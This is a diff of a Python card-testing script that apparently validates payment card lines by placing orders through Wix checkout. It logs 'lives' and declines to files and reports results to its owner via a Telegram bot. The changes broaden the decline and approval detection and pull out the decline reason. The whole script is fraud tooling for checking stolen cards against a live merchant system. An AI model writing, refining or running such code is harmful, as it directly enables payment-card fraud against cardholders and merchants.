@@ -83,7 +83,6 @@ COMMON_CONFIG = '%7B%22brand%22%3A%22wix%22%2C%22host%22%3A%22VIEWER%22%2C%22BSI
 
 
 def notificar_propietario(mensaje):
-    """Envía un mensaje de log/reporte al propietario."""
     try:
         bot.send_message(PROPIETARIO_ID, mensaje, parse_mode="HTML")
     except Exception as e:
@@ -647,13 +646,17 @@ def procesar_tarjeta_wix(linea_cc):
         resp = session.post(url_place_order, headers=headers_place_order, json=payload_place_order, timeout=20)
         resultado = resp.text
 
-        if 'description":"Invalid payment status: DECLINED"' in resultado or '"transactionStatus":"DECLINED"' in resultado:
+        if 'description":"Invalid payment status: DECLINED"' in resultado or '"transactionStatus":"DECLINED"' in resultado or 'DECLINED' in resultado:
             msg_fail = "Declined"
+            try:
+                msg_fail = resp.json().get("description", "Declined")
+            except Exception:
+                pass
             with open(FAIL_FILE, "a", encoding="utf-8") as f:
                 f.write(f"{linea_cc} | {msg_fail}\n")
             return False, msg_fail
 
-        if '"completed":true, "paymentResponseToken"' in resultado or resp.status_code == 200:
+        if '"completed":true' in resultado or "paymentResponseToken" in resultado or resp.status_code == 200:
             msg_success = "Approved ($50 Charged/Success)"
             with open(LIVES_FILE, "a", encoding="utf-8") as f:
                 f.write(f"{linea_cc} | {msg_success}\n")
